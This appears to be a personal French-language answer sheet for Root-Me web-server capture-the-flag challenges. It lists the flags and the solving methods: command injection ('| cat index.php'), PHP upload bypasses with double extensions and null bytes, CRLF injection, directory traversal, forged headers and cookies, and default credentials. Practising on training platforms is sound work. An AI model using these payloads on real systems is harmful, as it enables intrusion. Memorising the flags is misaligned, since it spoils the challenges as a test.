# web-server

## HTML - Code source
hint: inspecter élément
- nZ^&@q5&sjJHev0 

## HTTP - Open redirect

solve:  curl -G http://challenge01.root-me.org/web-serveur/ch52/ -d "url=https://google.fr&h=0edf27c83d4aa4699c0625d27be0e371" -o solve.txt 

- e6f8a530811d5a479812d7b82fc1a5c5 


## HTTP - User-agent


solve: curl -H "User-Agent: admin" http://challenge01.root-me.org/web-serveur/ch2/

- rr$Li9%L34qd1AAe27


## Mot de passe faible

solve: admin/admin

- admin

## PHP - Injection de commande

solve: | cat index.php 

- S3rv1ceP1n9Sup3rS3cure

## Fichier de sauvegarde

solve: index.php~ 

- OCCY9AcNm1tj

## HTTP - Directory indexing

hint: admin/backup/admin.txt

- LINUX

## HTTP - Headers
hint: python headers.py ou curl --header "Header-RootMe-Admin:admin" http://challenge01.root-me.org/web-serveur/ch5/

- HeadersMayBeUseful

## HTTP - Post
hint: supprimer le js et modifier le score

- H7tp_h4s_N0_s3Cr37S_F0r_y0U

## HTTP - Improper redirect
hint: curl http://challenge01.root-me.org/web-serveur/ch32/

- ExecutionAfterRedirectIsBad

## HTTP - Verb tampering

hint: curl -X PUT http://challenge01.root-me.org/web-serveur/ch8/

- a23e$dme96d3saez$$prap

## Install files

hint: phpbb/install/install.php 

- karambar

## File upload - Double extensions
hint: poster le fichier upload.php et le changer en upload.php.png 

- Gg9LRz-hWSxqqUKd77-_q-6G8

## File upload - Type MIME
hint: poster le fichier upload.php et le changer en upload.php%00.png 

## HTTP - Cookies

hint: utiliser curl 

- curl http://challenge01.root-me.org/web-serveur/ch7/ --cookie "ch7=admin"  | cut -d '<' -f2  | cut -d ':' -f2

- ml-SYMPA 

## File upload - Null byte
- utiliser le fichier nullbyte.php%00.png 
- YPNchi2NmTwygr2dgCCF 

## CRLF

- ?username=admin authenticated.%0D%0Aa&password=admin

- rFSP&G0p&5uAg1%

## Directory traversal

- http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=

- http://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r/

- http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=86hwnX2r/

- http://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r//password.txt

- kcb$!Bx@v4Gs9Ez